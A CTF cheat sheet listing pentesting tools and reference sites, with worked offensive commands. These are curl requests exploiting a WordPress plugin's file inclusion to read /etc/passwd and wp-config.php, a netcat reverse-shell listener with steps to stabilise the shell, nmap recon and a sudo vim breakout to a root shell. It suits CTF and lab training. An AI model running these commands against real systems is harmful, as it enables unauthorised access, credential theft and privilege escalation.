# CTF Cheat Sheet

This cheat sheet provides many tools, tips and tricks that can be useful in CTF (capture the flag) challenges.

## Distros and Frameworks

| Distribution | Link | Description |
| ------------ | ---- | ----------- |
| Kali Linux | [kali.org](https://www.kali.org) | Linux distro loaded with an arsenel of pentesting tools and documentation. The most popular pentesting distro. |
| ParrotSec | [parrotsec.org](https://parrotsec.org) | Linux distro loaded with pentesting tools, similar to Kali. Parrot is more lightweight and has less tools installed out of the box, so may be more beginner-friendly if you don't like bloated distros. |
| Remnux | [remnux.org](https://remnux.org) | A Linux distro loaded with tools for reverse-engineering and malware analysis. |
| Docker | [docker.com](https://docker.com) | A containerisation platform used to run self-contained binaries and services in their own sandboxed environment. Similar to a virtual machine but uses far less resources, at the expense of sharing the same kernel as the host operating system. Many pentesting tools have pre-made containers in the Docker registry. |

## Docker Resources

| Image | Link | Description |
| ----- | ---- | ----------- |
| Kali Rolling | [hub.docker.com](https://hub.docker.com/r/kalilinux/kali-rolling) | Functional Kali Linux container, updated weekly in accordance with the Kali rolling repository. Not that there aren't any tools installed by default - do this via: `apt update && apt install -y kali-linux-headless` |
| ParrotSec | [hub.docker.com](https://hub.docker.com/r/parrotsec/security) | Parrot Security container with the tools present in the ParrotSec VM and on the ISO. Use the **rolling** tag to get the more recent tools in line with the rolling release packages maintained by the Parrot team. |
| OWASP Amass | [hub.docker.com](https://hub.docker.com/r/caffix/amass) | OWASP Amass performs network mapping of attack surfaces and external asset discovery via OSINT and active recon techniques. | 

## Reference Tools and Websites

| Name | Site | Description |
| ---- | ---- | ----------- |
| GTFOBins | [gtfobins.github.io](https://gtfobins.github.io) | Curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. Useful for privilege escalation on a box where you have to live off the land. |
| HackTricks | [book.hacktricks.xyz](https://book.hacktricks.xyz) | GitBook of tricks, techniques and tools learned by the author during CTFs, IRL engagements and research. |
| PentestMonkey Cheat Sheets | [pentestmonkey.net](https://pentestmonkey.net/category/cheat-sheet) | A collection of cheat sheets. Nuff said, check back regularly for updated content. |
| CrackStation | [crackstation.net](https://crackstation.net) | Useful site for checking found hashes against known hash lists and rainbow tables. |
| RevShells | [revshells.com](https://revshells.com) | Generate syntax for spawning reverse shells depending on desired shell prompt and language used in RCE exploits. |
| PayloadsAllTheThings | [GitHub: PayloadsAllTheThings](https://github.com/swisskeyrepo/PayloadsAllTheThings) | A list of useful payloads and bypasses for Web Application Security. Available in the Kali repos. |
| SecLists | [GitHub: SecLists](https://github.com/danielmiessler/SecLists) | A collection of multiple types of lists used during security assessments, collected in one place. Typically installed by default in Kali and Parrot, and available in the Kali repos. |
| SearchSploit | [GitHub: SearchSploit](https://github.com/offensive-security/searchsploit) | An archive of public exploits and corresponding vulnerable software. Developed for use by pentesters and vulnerability researchers. Allows you to search ExploitDB while offline. Preinstalled on Kali. |
| DeHashed | [dehashed.com](https://dehashed.com) | Search engine for compromised credentials |
| Spyse | [spyse.com](https://spyse.com) | Internet assets search engine for miscellaneous enumeration tasks |
| Talos | [talosintelligence.com](https://talosintelligence.com) | IP address reputation lookup |

## OSINT - Open Source INTelligence
### I'm Stuck!
If you're ever stuck on an OSINT challenge, look at the [OSINT Framework](https://osintframework.com) website for a tool that you can use to run your breadcrumb through.

If you want to know who an email address is registered to, use the [EPIEOS Email Lookup](https://tools.epieos.com/email.php) to run an email address and gain further intel. The site also runs the email through holehe and returns results from other common online services that the email address is used on.

Use this especially for Gmail accounts, as the tool will return the Google account details for that address. This also works for Google Workspace (G Suite) addresses.

## Reverse Engineering and Binary Exploitation

### Tools
| Name | Link | Description |
| ---- | ---- | ----------- |
| radare2 | [radare2](https://rada.re/n/radare2.html) | A free/libre toolchain for easing several low-level tasks like forensics, software reverse engineering, exploiting, debugging, etc. Installed by default in Kali |
| Cutter | [cutter.re](https://cutter.re) | An open-source reverse engineering platform powered by the Rizin framework (Rizin is a fork of radare2). Available for download as an AppImage on Linux, as well as Windows and MacOS. |
| dnspy | [GitHub: dnSpy](https://github.com/dnSpy/dnSpy) | A debugger and .NET assembly editor. Requires Windows - use ilSpy if you want to debug on Linux. |
| Immunity Debugger | [Immunity Debugger](https://immunityinc.com/products/debugger/) | A lightweight debugger geared for InfoSec professionals, with a Python API for easy extensibility. |

### Fingerprinting a Binary
When looking at a file that's not immediately obvious as to what it is, run the `file` command against it and you'll be given a best guess as to what the file is.

```console
mk@0x01:~$ file cmus
cmus: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d840331586ee2dab927367939ac426fb10a2a0ea, for GNU/Linux 3.2.0, stripped
```

The example above is the output for the cmus music player, look at your own output for what to reach for next.

**Shortcut**: If the file output references .NET or Mono, you have a .NET binary and should jump straight to using dnSpy or ilSpy to disassemble and/or decompile the binary.

### Static Analysis

There are several ways to go about static analysis when dealing with binaries.
- You can hexdump the binary data
- You can use a decompiler or disassembler to see the assembly code
- You can run `strings` to dump out any text strings from the binary and see if anything stands out
- You can run the binary through a tool like **radare2** or **Cutter** to examine the contents of the binary.

Installing and running Cutter will give you the best of all of these, as you can see all of the above information within one utility. You still have the option of dropping to the command line and analysing the bits that way, but if you're after a single place to extract the above data, Cutter may be the best tool for you.

### Dynamic Analysis

The dynamic analysis is more variable in its execution, as you're literally running the binary and looking at its activity via a debugger. The tools you use will depend on the inteneded operating system and CPU architecture, as well as the source programming language and the compiler used. There are many debuggers available for Windows (IDA Pro, SoftIce, Immunity Debugger), and Linux typically uses the GCC libraries and the gdb binary to debug ELF binaries.

## DFIR - Digital Forensics and Incident Response

| Tool | Link | Description |
| ---- | ---- | ----------- |
| Volatility Framework | [volatilityfoundation.org](https://volatilityfoundation.org) | A framework used in memory analysis and forensics. 

**Note**: DFIR is not only about memory analysis. More complex CTF challenges can require you to have some experience in reverse engineering in order to capture the flag. In TamilCTF 2021, the Ransomware challenge implemented a fake flag process part-way through the challenge that was designed to trip up players. Getting the true flag required analysing files in Ghidra and piecing together components of the flag. [Here's the writeup](https://github.com/OxOv3rH4uL/OxOv3rH4uL.github.io/blob/main/FORENSICS/ransomware.pdf) on that challenge.

### Raw Memory Analysis

Analysing memory files can be done in several ways, but one of the most complete toolkits for the job is the Volatility Framework. Volatility has a plethora of built-in features and community plugins dedicated to memory analysis and supports memory dumps from most Windows, MacOS and Linux OSes. Check out the above writeup for the Ransomware challenge to see what's possible with the framework.

## Malware

## Web

Sometimes you'll come across a website in a CTF that gives you another breadcrumb, but no indication as to what to do next. These are some tools you can use to get some more info on the target site and perform further enumeration.

### Web Server Scanning and Enumeration

| Tool | Link | Description |
| ---- | ---- | ----------- |
| DirBuster | [tools.kali.org](https://tools.kali.org/web-applications/dirbuster) | Multi-threaded Java application for brute-forcing directories and filenames on web/application servers. Installed by default on Kali. |
| GoBuster | [tools.kali.org](https://tools.kali.org/web-applications/gobuster) | Implementation of DirBuster written in Go. Supports both URIs and DNS subdomains with wildcard support. Installed by default on Kali. |
| FeroxBuster | [GitHub: feroxbuster](https://github.com/epi052/feroxbuster) | Implementation of DirBuster written in Rust. Supports all featres of DirBuster/GoBuster. |
| Nikto | [tools.kali.org](https://tools.kali.org/information-gathering/nikto) | Web server scanner that performs tests against web servers for multiple items. Tests for over 6700 PUPs, outdated server versions on over 1250 servers, server configuration items, HTTP server options, and attempt to fingerprint the web server and software. **Note**: it's not a stealthy tool, it will generate noise and probably set off a WAF and/or IPS/IDS.

**Note**: The syntax used here is for feroxbuster, use the syntax of dirbuster/gobuster if you want to use that instead.

### WordPress Enumeration

If you fingerprint a site and find out that it's a WordPress install, use `wpscan` to interrogate the site and find potential vulnerabilities. If the output of the scan shows vulnerabilities, search for those vulns in ExploitDB or via SearchSploit to learn more about how to conduct that exploit. Common WordPress exploits generally result in some form of RCE (to get a reverse shell) or to reveal data outside the web server root directory. For example, the Spritz 1.0 plugin is vulnerable to both LFI (Local File Inclusion) and RFI (Remote File Inclusion).
```console
# Show the contents of /etc/passwd
mk@0x01:~$ curl http://192.168.0.73/wordpress/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/passwd

# Show the contents of wp-config.php
mk@0x01:~$ curl http://192.168.0.73/wordpress/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../wp-config.php
```

This type of attack can often be used to find a set of credentials to gain access to the WP Admin dashboard, which you can then use to inject code to spawn a reverse shell, or run another payload generated by metasploit. Once you have a shell on the target server, generally the next step is some form of privilege escalation. Refer to GTFOBins or PEASS-ng for how you can escalate.

### Reverse Shell Listener

Here's a basic listener to spawn the reverse shell.

```console
mk@0x01:~$ nc -lnvp 9999
```

Ports are arbitrary, just make sure that you set both the target IP and port in the reverse shell payload to match your attacking machine. For HTB/THM boxes this would generally be the IPv4 address of the tun0 interface. Here's how to easily get that:

```console
mk@0x01:~$ ip -4 a s tun0 | grep -Po 'inet \K[\d.]+'
```

## Mobile (Android/iOS)

## Miscellaneous

### Stabilising Your Reverse Shell

Going back to that nc listener for a second:

```console
mk@0x01:~$ nc -lnvp 9999
```

Once the reverse shell connects and you have the reverse shell, there are still elements of a true shell missing.
- Some commands like `su` and `ssh` require a proper terminal to run
- Shells in netcat don't handle SIGINT correctly
- Stderr normally isn't displayed, so no error output in the reverse shell
- You can't use text editors like `vim` properly
- You have no job control
- You have no command history
- You have no tab completion
- If you accidentally CTRL+C in the listener, you'll kill the listener and the shell with it.

Basically, the shell is fragile and dumb, and it needs to be stabilised if you need anything remotely close to persistence. There are many ways to generate a reverse shell, with out without tools like `msfvenom`, that will spawn the shell for you to catch. As such, I'm only concerned with stabilising the shell once we've caught it with netcat.

#### Spawn a PTY Using Python

If the victim server has Python installed, we can spawn a new shell prompt with the following command:

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

This will give you a nicer prompt, as well as being able to run commands like `su` without any problems.

#### Upgrade from Netcat to Full TTY

You can use upgrade the dumb netcat shell to a full TTY with the following process:

1. Spawn a new PTY via Python just like before, and then background it by pressing CTRL+Z.

```console
mk@0x01:~$ nc -lnvp 9999
listening on [any] 9999 ...
10.0.3.7: inverse host lookup failed: Unknown host
connect to [10.0.3.4] from (UNKNOWN) [10.0.3.7] 57202
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@focal64:/tmp$ ^Z
[1]+ Stopped                nc -lnvp 9999
mk@0x01:~$
```

2. While the shell has been sent to the background, check the current terminal and STTY info so we can force the connected shell to match it.

```console
mk@0x01:~$ echo $TERM
xterm-256color

mk@0x01:~$ stty -a
speed 38400 baud; rows 38; columns 116; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q;
stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
```

The info we need is the TERM type (*xterm-256color*) and the size of the current TTY (*rows 38; columns 116*).

3. While the shell is still backgrounded, set the current STTY to raw and tell it to echo the input characters.

```console
stty raw -echo
```

When changing the shell to a raw stty, things are gonna look weird and you the next commands won't be visible.

4. Foreground the shell with `fg` and reinitialise the terminal with `reset`. When foregrounding the shell, you'll see the netcat command appear again, this is normal as it's showing the command for the job you foregrounded.

```console
mk@0x01:~$ stty raw -echo
mk@0x01:~$ nc -lnvp 9999
                        reset
```

5. Finally, set the shell to match your shell from the info gathered earlier.

```console
www-data@focal64:~$ export SHELL=bash
www-data@focal64:~$ export TERM=xterm-256color
www-data@focal64:~$ stty rows 38 columns 116
```

The end result is a fully interactive TTY with all features we want and expect - all over a netcat connection!

## Network Discovery

### Nmap Recon

My standard Nmap recon generally starts with the following:

```console
mk@0x01:~$ export ip = 1.2.3.4
mk@0x01:~$ export ports = $(nmap -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

mk@0x01:~$ nmap -sC -sV -oN nmap/initial -p$ports $ip
```
Shout out to [John Hammond](https://youtube.com/johnhammond010) for showcasing this in many a video.

## Privilege Escalation

### Tools
| Name | Link | Description |
| ---- | ---- | ----------- |
| PEASS-ng | [Github: PEASS-ng](https://github.com/carlospolop/PEASS-ng) | Privilege Escalation Awesome Scripts Suite |
| GTFOBins | [gtfobins.github.io](https://gtfobins.github.io) | Curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. Useful for privilege escalation on a box where you have to live off the land. |

### Vim Breakout

If you can run vim as a super user via sudo, it doesn't drop elevated privileges when spawning a shell from vim itself.

```console
sudo vim -c ':!/bin/sh'
```

If you're in vim already:

```vim
:set shell=/bin/sh
:shell
```

The above will spawn a new shell. Then jump into Bash and have at it :)
